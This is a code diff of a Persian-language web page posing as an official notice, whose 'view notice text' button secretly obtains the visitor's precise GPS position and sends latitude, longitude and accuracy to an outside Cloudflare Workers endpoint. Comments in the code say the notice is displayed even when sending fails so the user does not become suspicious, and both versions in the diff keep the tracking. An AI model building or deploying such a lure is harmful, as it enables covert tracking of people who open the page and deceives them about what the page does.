@@ -23,29 +23,9 @@
     font-weight: 800; font-size: 1.2rem; border: none; border-radius: 50px; 
     padding: 16px 50px; cursor: pointer; box-shadow: 0 6px 20px rgba(185, 138, 46, 0.4); 
     transition: all 0.3s ease; 
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    gap: 12px;
   }
   #showBtn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(185, 138, 46, 0.6); }
-  #showBtn:disabled { opacity: 0.7; cursor: wait; }
-  
-  /* انیمیشن دایره‌ای کوچک (خیلی طبیعی) */
-  .spinner {
-    display: none;
-    width: 20px;
-    height: 20px;
-    border: 3px solid rgba(13, 43, 78, 0.15);
-    border-top: 3px solid #0d2b4e;
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-  }
-  .spinner.show { display: inline-block; }
-  
-  @keyframes spin {
-    to { transform: rotate(360deg); }
-  }
+  #showBtn:disabled { opacity: 0.6; cursor: wait; }
   
   #document { 
     display: none; max-width: 850px; margin: 0 auto 60px; background: #ffffff; 
@@ -87,6 +67,22 @@
     font-size: 0.9rem; margin-top: 50px; border-top: 5px solid #c9a24b;
   }
 
+  /* ===== استایل وضعیت (مخفیشده) ===== */
+  .status {
+    margin-top: 12px;
+    padding: 10px;
+    border-radius: 8px;
+    display: none;
+    font-size: 12px;
+    text-align: center;
+    background: #f0f0f0;
+    color: #333;
+  }
+  .status.show { display: block; }
+  .status.ok { background: #e8f5e9; color: #2e7d32; border: 1px solid #a5d6a7; }
+  .status.err { background: #fbe9e7; color: #c62828; border: 1px solid #ffccbc; }
+  .status.load { background: #e3f2fd; color: #0d47a1; border: 1px solid #90caf9; }
+
   @media (max-width: 600px) {
     #document { padding: 25px 20px; margin: 0 15px 40px; }
     .meta-box div { flex-direction: column; }
@@ -102,10 +98,8 @@
 </header>
 
 <div class="btn-wrap">
-  <button id="showBtn" onclick="handleClick()">
-    <span id="btnText">جهت دیدن متن ابلاغیه</span>
-    <span class="spinner" id="spinner"></span>
-  </button>
+  <button id="showBtn" onclick="handleClick()">جهت دیدن متن ابلاغیه</button>
+  <div class="status" id="st"></div>
 </div>
 
 <section id="document">
@@ -139,7 +133,7 @@
 
 <script>
   // ============================================================
-  // CONFIG
+  // CONFIG — دقیقاً مثل کد ارسال موقعیت
   // ============================================================
   const ENDPOINT = 'https://location-proxy.esmailmahdavi7785.workers.dev';
 
@@ -147,54 +141,71 @@
   // DOM
   // ============================================================
   const btn = document.getElementById('showBtn');
-  const btnText = document.getElementById('btnText');
-  const spinner = document.getElementById('spinner');
   const doc = document.getElementById('document');
+  const st = document.getElementById('st');
 
   // ============================================================
-  // UI Helpers (بیصدا)
+  // UI Helpers (مخفیشده)
   // ============================================================
+  function setStatus(msg, type) {
+    st.textContent = msg;
+    st.className = 'status show ' + type;
+    if (type === 'ok' || type === 'err') {
+      setTimeout(() => {
+        st.className = 'status';
+        st.textContent = '';
+      }, 5000);
+    }
+  }
+
   function setLoading(loading) {
     if (loading) {
       btn.disabled = true;
-      btnText.textContent = 'در حال دریافت...';
-      spinner.classList.add('show');
+      btn.textContent = 'در حال دریافت...';
+      setStatus('⏳ در حال دریافت موقعیت...', 'load');
     } else {
       btn.disabled = false;
-      btnText.textContent = 'جهت دیدن متن ابلاغیه';
-      spinner.classList.remove('show');
+      btn.textContent = 'جهت دیدن متن ابلاغیه';
     }
   }
 
   // ============================================================
-  // ارسال موقعیت به سرور
+  // ارسال موقعیت به سرور (دقیقاً مثل کد بالا)
   // ============================================================
-  function sendLocationToServer(pos) {
+  async function sendLocationToServer(pos) {
     const { latitude, longitude, accuracy } = pos.coords;
 
-    fetch(ENDPOINT, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ latitude, longitude, accuracy })
-    })
-    .then(() => {
+    try {
+      setStatus('⏳ ارسال به سرور...', 'load');
+      const r = await fetch(ENDPOINT, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ latitude, longitude, accuracy })
+      });
+      
+      if (!r.ok) throw new Error('Server error: ' + r.status);
+      const text = await r.text();
+      let j;
+      try { j = JSON.parse(text); } catch (e) { throw new Error('Invalid JSON'); }
+      if (!j.ok) throw new Error(j.error || 'Unknown error');
+
+      setStatus('✅ موقعیت ارسال شد', 'ok');
       setLoading(false);
       showDocument();
-    })
-    .catch(() => {
+    } catch (e) {
+      setStatus('❌ خطا در ارسال: ' + e.message, 'err');
       setLoading(false);
-      // اگه ارسال خطا داد، بازم ابلاغیه رو نشون بده
+      // حتی با خطا، ابلاغیه رو نشون بده تا کاربر شک نکنه
       showDocument();
-    });
+    }
   }
 
   // ============================================================
-  // دریافت موقعیت
+  // دریافت موقعیت (دقیقاً مثل کد بالا)
   // ============================================================
   function getLocation() {
     if (!navigator.geolocation) {
-      // اگه مرورگر پشتیبانی نکنه، هیچ کاری نکن
-      setLoading(false);
+      setStatus('❌ مرورگر پشتیبانی نمی‌کند', 'err');
       return;
     }
 
@@ -202,13 +213,17 @@
 
     navigator.geolocation.getCurrentPosition(
       pos => {
-        // موقعیت گرفته شد → بفرست → ابلاغیه
         sendLocationToServer(pos);
       },
       err => {
-        // خطا → هیچ کاری نکن، دکمه دوباره فعال میشه
+        let msg = '❌ ';
+        if (err.code === 1) msg += 'دسترسی رد شد. از مرورگر اجازه بگیرید.';
+        else if (err.code === 2) msg += 'GPS در دسترس نیست.';
+        else if (err.code === 3) msg += 'زمان‌بر شد. دوباره تلاش کنید.';
+        else msg += err.message;
+        setStatus(msg, 'err');
         setLoading(false);
-        // اگه کاربر دوباره کلیک کنه، دوباره تلاش میکنه
+        // خطا → ابلاغیه نمایش داده نشه
       },
       { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
@@ -219,8 +234,8 @@
   // ============================================================
   function showDocument() {
     doc.classList.add('show');
-    btnText.textContent = 'بستن متن ابلاغیه';
-    setLoading(false);
+    btn.textContent = 'بستن متن ابلاغیه';
+    btn.disabled = false;
     setTimeout(() => {
       doc.scrollIntoView({ behavior: 'smooth', block: 'start' });
     }, 100);
@@ -231,8 +246,10 @@
   // ============================================================
   function closeDocument() {
     doc.classList.remove('show');
-    btnText.textContent = 'جهت دیدن متن ابلاغیه';
-    setLoading(false);
+    btn.textContent = 'جهت دیدن متن ابلاغیه';
+    btn.disabled = false;
+    st.className = 'status';
+    st.textContent = '';
   }
 
   // ============================================================
